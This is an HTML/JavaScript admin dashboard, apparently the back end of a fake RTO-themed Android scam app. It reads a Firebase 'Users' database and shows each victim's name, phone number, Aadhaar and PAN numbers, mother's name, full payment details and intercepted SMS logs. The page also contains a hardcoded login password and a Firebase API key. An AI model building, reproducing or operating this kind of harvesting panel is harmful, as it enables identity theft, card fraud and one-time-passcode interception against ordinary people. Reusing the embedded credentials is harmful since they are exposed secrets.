<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RTO Admin Panel - Full Data View</title>
    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-database-compat.js"></script>
    <style>
        body { font-family: sans-serif; background: #eef2f7; padding: 15px; margin: 0; }
        .login-box { max-width: 350px; margin: 80px auto; background: white; padding: 25px; border-radius: 15px; text-align: center; box-shadow: 0 5px 20px rgba(0,0,0,0.1); }
        .dashboard { display: none; max-width: 950px; margin: 0 auto; }
        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; }
        button { background: #007bff; color: white; border: none; padding: 12px 25px; border-radius: 8px; cursor: pointer; width: 100%; font-weight: bold; }
        
        .card { background: white; margin-bottom: 20px; border-radius: 12px; overflow: hidden; box-shadow: 0 3px 10px rgba(0,0,0,0.08); border-top: 5px solid #007bff; }
        .card-header { background: #f8f9fa; padding: 15px; border-bottom: 1px solid #eee; display: flex; justify-content: space-between; align-items: center; }
        .card-body { padding: 15px; }
        
        .data-row { display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 15px; }
        .data-item { background: #f1f4f9; padding: 10px; border-radius: 8px; min-width: 140px; flex: 1; border: 1px solid #e0e6ed; }
        .label { font-size: 11px; color: #666; text-transform: uppercase; display: block; margin-bottom: 4px; font-weight: bold; }
        .value { font-size: 15px; color: #222; font-weight: bold; word-break: break-all; }

        .payment-highlight { background: #fff9c4; border: 2px dashed #fbc02d; padding: 12px; border-radius: 10px; margin-top: 10px; }
        .payment-highlight h4 { margin: 0 0 10px 0; color: #f57f17; font-size: 14px; }

        .sms-log { background: #e3f2fd; padding: 10px; border-radius: 8px; margin-top: 8px; border-left: 4px solid #2196f3; font-size: 13px; }
        .sms-meta { color: #1976d2; font-weight: bold; margin-bottom: 3px; font-size: 12px; }
        
        .refresh-btn { background: #28a745; width: auto; padding: 8px 20px; margin-bottom: 20px; }
    </style>
</head>
<body>

    <div id="login-section" class="login-box">
        <h3>Admin Login</h3>
        <input type="password" id="passInput" placeholder="Enter Password">
        <button onclick="checkPassword()">VIEW DATA</button>
        <p id="err" style="color:red; display:none; margin-top:10px;">‡§ó‡§≤‡§§ ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§°!</p>
    </div>

    <div id="dashboard-section" class="dashboard">
        <div style="display: flex; justify-content: space-between; align-items: center;">
            <h2>RTO DATABASE (LIVE)</h2>
            <button class="refresh-btn" onclick="location.reload()">Refresh Page</button>
        </div>
        <div id="data-list">Loading...</div>
    </div>

    <script>
        const SECRET_PASSWORD = "Zuhi@143"; 

        const firebaseConfig = {
            apiKey: "AIzaSyDr3oTjWGrvd9tRi7go-M4ssL8rAipNdMQ",
            authDomain: "hkfhaiufahf.firebaseapp.com",
            databaseURL: "https://hkfhaiufahf-default-rtdb.firebaseio.com",
            projectId: "hkfhaiufahf",
            storageBucket: "hkfhaiufahf.appspot.com",
            messagingSenderId: "1089730321892",
            appId: "1:1089730321892:android:42a51f98cc3a1195453bf1"
        };

        firebase.initializeApp(firebaseConfig);
        const db = firebase.database().ref("Users");

        function checkPassword() {
            if (document.getElementById("passInput").value === SECRET_PASSWORD) {
                document.getElementById("login-section").style.display = "none";
                document.getElementById("dashboard-section").style.display = "block";
                loadData();
            } else { document.getElementById("err").style.display = "block"; }
        }

        function loadData() {
            db.on("value", (snapshot) => {
                const list = document.getElementById("data-list");
                list.innerHTML = "";
                const data = snapshot.val();
                if (!data) { list.innerHTML = "No Data Found"; return; }

                Object.keys(data).reverse().forEach(id => {
                    const user = data[id];
                    let html = `<div class="card">
                        <div class="card-header">
                            <span class="value">${user.name || 'N/A'}</span>
                            <span style="color:#007bff; font-weight:bold;">${user.number || ''}</span>
                        </div>
                        <div class="card-body">
                            <div class="data-row">
                                <div class="data-item"><span class="label">Aadhaar</span><span class="value">${user.aadhaar || 'N/A'}</span></div>
                                <div class="data-item"><span class="label">PAN</span><span class="value">${user.pan || 'N/A'}</span></div>
                                <div class="data-item"><span class="label">Mother</span><span class="value">${user.motherName || 'N/A'}</span></div>
                                <div class="data-item"><span class="label">Mode</span><span class="value" style="color:blue">${user.paymentMode || 'N/A'}</span></div>
                            </div>`;

                    // --- PAYMENT DETAILS (IS PAR DHAYAN DEN) ---
                    if (user.paymentDetails) {
                        html += `<div class="payment-highlight">
                                    <h4>üí≥ FULL PAYMENT DATA:</h4>
                                    <div class="data-row">`;
                        for (let [key, val] of Object.entries(user.paymentDetails)) {
                            html += `<div class="data-item" style="background:white;"><span class="label">${key.toUpperCase()}</span><span class="value" style="color:#d32f2f">${val}</span></div>`;
                        }
                        html += `</div></div>`;
                    }

                    // --- SMS LOGS ---
                    if (user.messages) {
                        html += `<div style="margin-top:15px;"><span class="label">SMS LOGS</span>`;
                        Object.keys(user.messages).reverse().forEach(mId => {
                            const msg = user.messages[mId];
                            html += `<div class="sms-log">
                                <div class="sms-meta">From: ${msg.sender} | ${new Date(msg.timestamp).toLocaleString()}</div>
                                <div>${msg.message}</div>
                            </div>`;
                        });
                        html += `</div>`;
                    }

                    html += `</div></div>`;
                    list.innerHTML += html;
                });
            });
        }
    </script>
</body>
</html>
